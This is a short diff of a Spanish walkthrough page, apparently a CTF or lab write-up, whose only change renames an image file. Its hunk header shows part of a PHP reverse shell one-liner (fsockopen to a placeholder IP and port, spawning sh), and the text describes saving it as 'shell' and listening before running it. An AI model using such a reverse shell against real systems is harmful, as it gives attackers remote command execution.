@@ -183,7 +183,7 @@ $sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2
 
 Le ponemos como nombre `shell`.
 
-<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (161) (1).png" alt=""><figcaption></figcaption></figure>
 
 Le daremos a `Sumbit`, volvemos a entrar a `shell`, le daremos al boton `Apply` y antes de darle a `run` nos pondremos a la escucha.
 
